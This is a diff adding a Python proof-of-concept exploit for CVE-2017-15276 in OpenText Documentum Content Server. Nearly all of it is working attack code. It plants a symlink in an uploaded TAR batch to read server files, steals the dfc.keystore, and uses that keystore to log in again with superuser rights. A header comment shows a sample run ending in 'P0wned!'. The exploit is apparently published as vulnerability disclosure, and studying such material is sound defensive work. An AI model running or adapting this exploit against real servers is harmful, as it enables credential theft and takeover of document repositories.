@@ -1,0 +1,242 @@
+#!/usr/bin/env python
+
+# Opentext Documentum Content Server (formerly known as EMC Documentum Content Server)
+# contains following design gap, which allows authenticated user to gain privileges
+# of superuser:
+#
+# Content Server allows to upload content using batches (TAR archives), when unpacking
+# TAR archives Content Server fails to verify contents of TAR archive which
+# causes path traversal vulnerability via symlinks, because some files on Content Server
+# filesystem are security-sensitive the security flaw described above leads to
+# privilege escalation
+#
+# The PoC below demonstrates this vulnerability:
+#
+# MacBook-Pro:~ $ python CVE-2017-15276.py
+# usage:
+# OTDocumentumTarVulnerability.py host port user password
+# MacBook-Pro:~ $ python CVE-2017-15276.py docu72dev01 10001 dm_bof_registry dm_bof_registry
+# Trying to connect to docu72dev01:10001 as dm_bof_registry ...
+# Connected to docu72dev01:10001, docbase: DCTM_DEV, version: 7.2.0270.0377  Linux64.Oracle
+# Downloading /u01/documentum/cs/product/7.2/bin/dm_set_server_env.sh
+# Creating malicious dmr_content object
+# Trying to find any object with content...
+#     Downloading /u01/documentum/cs/shared/config/dfc.keystore
+# Creating malicious dmr_content object
+# Trying to find any object with content...
+#     Trying to connect to docu72dev01:10001 as dmadmin ...
+# Connected to docu72dev01:10001, docbase: DCTM_DEV, version: 7.2.0270.0377  Linux64.Oracle
+# P0wned!
+
+
+import io
+import socket
+import sys
+import tarfile
+
+from dctmpy import NULL_ID
+
+from dctmpy.docbaseclient import DocbaseClient
+from dctmpy.identity import Identity
+from dctmpy.obj.typedobject import TypedObject
+
+CIPHERS = "ALL:aNULL:!eNULL"
+
+
+def usage():
+    print "usage:\n%s host port user password" % sys.argv[0]
+
+
+def main():
+    if len(sys.argv) != 5:
+        usage()
+        exit(1)
+
+    (session, docbase) = create_session(*sys.argv[1:5])
+
+    if is_super_user(session):
+        print "Current user is a superuser, nothing to do"
+        exit(1)
+
+    admin_console = session.get_by_qualification(
+        "dm_method where object_name='dm_JMSAdminConsole'")
+    env_script = admin_console['method_verb']
+    env_script = env_script.replace('dm_jms_admin.sh', 'dm_set_server_env.sh')
+
+    keystore_path = None
+    script = str(download(session, env_script, bytearray()))
+    if not script:
+        print "Unable to download dm_set_server_env.sh"
+        exit(1)
+
+    for l in script.splitlines():
+        if not l.startswith("DOCUMENTUM_SHARED"):
+            continue
+        keystore_path = l.split('=')[1]
+        break
+
+    if not keystore_path:
+        print "Unable to determine DOCUMENTUM_SHARED"
+        exit(1)
+
+    keystore_path += "/config/dfc.keystore"
+    keystore = str(download(session, keystore_path, bytearray()))
+
+    if not keystore:
+        print "Unable to download dfc.keystore"
+        exit(1)
+
+    (session, docbase) = create_session(
+        sys.argv[1], sys.argv[2],
+        session.serverconfig['r_install_owner'], "",
+        identity=Identity(trusted=True, keystore=keystore))
+    if is_super_user(session):
+        print "P0wned!"
+
+
+def download(session, path, buf):
+    print "Downloading %s" % path
+
+    store = session.get_by_qualification("dm_store")
+    format = session.get_by_qualification("dm_format where name='crtext'")
+
+    print "Creating malicious dmr_content object"
+
+    session.apply(None, NULL_ID, "BEGIN_TRANS")
+
+    handle = session.make_pusher(store['r_object_id'])
+    if handle < 1:
+        print "Unable to create pusher"
+        end_tran(session, False)
+        exit(1)
+
+    (bytes, length) = create_tar("test", path)
+    b = bytearray()
+    b.extend(bytes.read())
+
+    print "Trying to find any object with content..."
+    object_id = session.query(
+        "SELECT FOR READ r_object_id "
+        "FROM dm_sysobject WHERE r_content_size>0") \
+        .next_record()['r_object_id']
+
+    content_id = session.next_id(0x06)
+
+    if not session.start_push(handle, content_id, format['r_object_id'], len(b)):
+        print "Failed to start push"
+        end_tran(session, False)
+        exit(1)
+
+    session.upload(handle, b)
+    data_ticket = session.end_push_v2(handle)['DATA_TICKET']
+
+    content = TypedObject(session=session)
+    content.set_string("OBJECT_TYPE", "dmr_content")
+    content.set_bool("IS_NEW_OBJECT", True)
+    content.set_id("storage_id", store['r_object_id'])
+    content.set_id("format", format['r_object_id'])
+    content.set_int("data_ticket", data_ticket)
+    content.set_int("page", 0)
+    content.set_string("page_modifier", "dm_batch")
+    content.set_string("full_format", format['name'])
+    content.set_int("content_size", len(b))
+    content.set_bool("BATCH_FLAG", True)
+    content.set_bool("IS_ADDRENDITION", True)
+    content.set_id("parent_id", object_id)
+    if not session.save_cont_attrs(content_id, content):
+        print "Failed to create content"
+        end_tran(session, False)
+        exit(1)
+
+    content = session.get_by_qualification(
+        "dmr_content WHERE any (parent_id='%s' "
+        "AND page_modifier='%s')" % (object_id, "vuln"))
+
+    handle = session.make_puller(
+        NULL_ID, store.object_id(), content['r_object_id'],
+        format.object_id(), data_ticket
+    )
+
+    if handle == 0:
+        end_tran(session, False)
+        raise RuntimeError("Unable make puller")
+
+    for chunk in session.download(handle):
+        buf.extend(chunk)
+
+    end_tran(session, False)
+    return buf
+
+
+def create_tar(linkname, linkpath):
+    bytes = io.BytesIO()
+    tar = tarfile.TarFile(fileobj=bytes, mode="w", format=tarfile.GNU_FORMAT)
+    add_link(tar, linkname, linkpath)
+    text = io.BytesIO()
+    text.write("file_name='%s'\n" % linkname)
+    text.write("page_modifier='vuln'\n")
+    text.write("parameters=''\n")
+    tarinfo = tarfile.TarInfo("property.txt")
+    tarinfo.size = text.tell()
+    text.seek(0)
+    tar.addfile(tarinfo, text)
+    tar.close()
+    length = bytes.tell()
+    bytes.seek(0)
+    return (bytes, length)
+
+
+def add_link(tar, linkname, linkpath):
+    tarinfo = tarfile.TarInfo(linkname)
+    tarinfo.type = tarfile.SYMTYPE
+    tarinfo.linkpath = linkpath
+    tarinfo.name = linkname
+    tar.addfile(tarinfo=tarinfo)
+
+
+def create_session(host, port, user, pwd, identity=None):
+    print "Trying to connect to %s:%s as %s ..." % \
+          (host, port, user)
+    session = None
+    try:
+        session = DocbaseClient(
+            host=host, port=int(port),
+            username=user, password=pwd,
+            identity=identity)
+    except socket.error, e:
+        if e.errno == 54:
+            session = DocbaseClient(
+                host=host, port=int(port),
+                username=user, password=pwd,
+                identity=identity,
+                secure=True, ciphers=CIPHERS)
+        else:
+            raise e
+    docbase = session.docbaseconfig['object_name']
+    version = session.serverconfig['r_server_version']
+    print "Connected to %s:%s, docbase: %s, version: %s" % \
+          (host, port, docbase, version)
+    return (session, docbase)
+
+
+def is_super_user(session):
+    user = session.get_by_qualification("dm_user WHERE user_name=USER")
+    if user['user_privileges'] == 16:
+        return True
+    group = session.get_by_qualification(
+        "dm_group where group_name='dm_superusers' "
+        "AND any i_all_users_names=USER")
+    if group is not None:
+        return True
+
+    return False
+
+
+def end_tran(session, commit=False):
+    obj = TypedObject(session=session)
+    obj.set_bool("COMMIT", commit)
+    session.apply(None, NULL_ID, "END_TRANS", obj)
+
+
+if __name__ == '__main__':
+    main()
